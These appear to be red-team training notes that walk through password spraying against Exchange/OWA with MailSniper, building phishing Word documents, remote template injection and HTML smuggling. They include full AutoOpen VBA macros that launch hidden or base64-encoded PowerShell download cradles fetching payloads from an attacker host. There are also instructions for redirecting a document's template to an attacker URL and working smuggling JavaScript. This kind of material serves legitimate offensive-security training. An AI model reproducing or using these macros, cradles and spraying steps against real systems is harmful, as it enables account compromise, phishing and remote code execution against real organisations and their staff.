## Password Spraying

---

1. Enumerate NetBIOS name of the target domain with [[MailSniper#Invoke-DomainHarvestOWA]]
``` powershell
ipmo C:\Tools\MailSniper\MailSniper.ps1
Invoke-DomainHarvestOWA -ExchHostname <domain>
```

2. Generate possible usernames from full names with [namemash.py](https://gist.github.com/superkojiman/11076951)
``` bash
./namemash.py names.txt > possible.txt
```

3. Validate which usernames are valid with [[MailSniper#Invoke-UsernameHarvestOWA]]
``` powershell
Invoke-UsernameHarvestOWA -ExchHostname <exchange_hostname> -Domain <domain> -UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt
```

4. Spray passwords against the valid accounts using Outlook Web Access (OWA), Exchange Web Services (EWS) and Exchange ActiveSync (EAS) with [[MailSniper#Invoke-PasswordSprayOWA]]
``` powershell
Invoke-PasswordSprayOWA -ExchHostname <exchange_hostname> -UserList .\Desktop\valid.txt -Password <password>
```

5. Download the global address list with valid credentials with [[MailSniper#Get-GlobalAddressList]]
``` powershell
Get-GlobalAddressList -ExchHostname <exchange_hostname> -UserName <domain>\<username> -Password <password> -OutFile .\Desktop\gal.txt
```


## Internal Phishing

---

### Initial Access Payloads

1. Send a URL where a payload can be downloaded.
2. Attach the payload to the phishing email.


### VBA Macros

- create beacon payload in [[Cobalt Strike#Create Beacon Payload]]
go to `Attacks > Scripted Web Delivery (S)` and generate a 64-bit PowerShell payload

![](https://files.cdn.thinkific.com/file_uploads/584845/images/94e/ba0/32d/swd.png)
![](https://files.cdn.thinkific.com/file_uploads/584845/images/5c5/5b6/77d/oneliner.png)

- prepare word document
	1. `File > Info > Inspect Document > Inspect Document`
	2. click `Inspect`
	3. click `Remove All`
	4. `File > Save As`
	5. use `.doc`

- host a file on [[Cobalt Strike#Host a File]] team server
`Site Management > Host File` and select document

![](https://files.cdn.thinkific.com/file_uploads/584845/images/087/4fa/7c4/host-file.png)

- auto open script
``` vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('<url>'))"""

End Sub
```

[Here](https://github.com/ZeroPointSecurity/PhishingTemplates/tree/master/Office365) are some HTML templates based around Office 365 (a copy can also be found in `C:\Tools\PhishingTemplates`).  Open one of them, e.g. `Word.html` in Edge or another browser. Amazingly, what you can do is `Ctrl + A` and `Ctrl + C` to copy the content; and then `Ctrl + V` to paste it directly into the OWA text editor.  All the text and image formatting should be preserved.

You can change the text placeholders and URL to the payload on lines [160](https://github.com/ZeroPointSecurity/PhishingTemplates/blob/master/Office365/Word.html#L160), [183](https://github.com/ZeroPointSecurity/PhishingTemplates/blob/master/Office365/Word.html#L183), [192](https://github.com/ZeroPointSecurity/PhishingTemplates/blob/master/Office365/Word.html#L192), [197](https://github.com/ZeroPointSecurity/PhishingTemplates/blob/master/Office365/Word.html#L197), and [207](https://github.com/ZeroPointSecurity/PhishingTemplates/blob/master/Office365/Word.html#L207).  My payload URL will be _http://nickelviper.com/ProductReport.doc_.

To prevent powershell from running as a childprocess of Word, use this example:
``` vba
Sub AutoOpen()

	Set shellWindows = GetObject("new:9BA05972-F6A8-11CF-A442-00A0C90A8F39")
	Set obj = shellWindows.Item()
	obj.Document.Application.ShellExecute "powershell.exe", "-nop -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AbgBpAGMAawBlAGwAdgBpAHAAZQByAC4AYwBvAG0ALwBhACIAKQA=", Null, Null, 0

End Sub
```

## Remote Template Injection

---

Open Word on the Attacker Desktop, create a new blank document and insert your desired macro.  Save this to `C:\Payloads` as a Word 97-2003 Template (*.dot) file.  This is now our "malicious remote template".  Use [[Cobalt Strike#Host a File]] to host this file at _http://nickelviper.com/template.dot_.

Next, create a new document from the blank template located in `C:\Users\Attacker\Documents\Custom Office Templates`.  Add any content you want, then save it to `C:\Payloads` as a new .docx.  Browse to the directory in explorer, right-click and select _7-Zip > Open archive_.  Navigate to _word > _rels, r_ight-click on `settings.xml.rels` and select _Edit_.

This is just a small XML file.  Scroll right until you see the _Target_ entry.

Target="file:///C:\Users\Attacker\Documents\Custom%20Office%20Templates\Blank%20Template.dotx"

It's currently pointing to the template on our local disk from which the document was created.  Simply modify this so it points to the template URL instead.

Target="http://nickelviper.com/template.dot"

## HTML Smuggling

---

``` html
<html>
    <head>
        <title>HTML Smuggling</title>
    </head>
    <body>
        <p>This is all the user will see...</p>

        <script>
        function convertFromBase64(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            var bytes = new Uint8Array( len );
            for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
            return bytes.buffer;
        }

        var file ='VGhpcyBpcyBhIHNtdWdnbGVkIGZpbGU=';
        var data = convertFromBase64(file);
        var blob = new Blob([data], {type: 'octet/stream'});
        var fileName = 'test.txt';

        if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
        else {
            var a = document.createElement('a');
            document.body.appendChild(a);
            a.style = 'display: none';
            var url = window.URL.createObjectURL(blob);
            a.href = url;
            a.download = fileName;
            a.click();
            window.URL.revokeObjectURL(url);
        }
        </script>
    </body>
</html>
```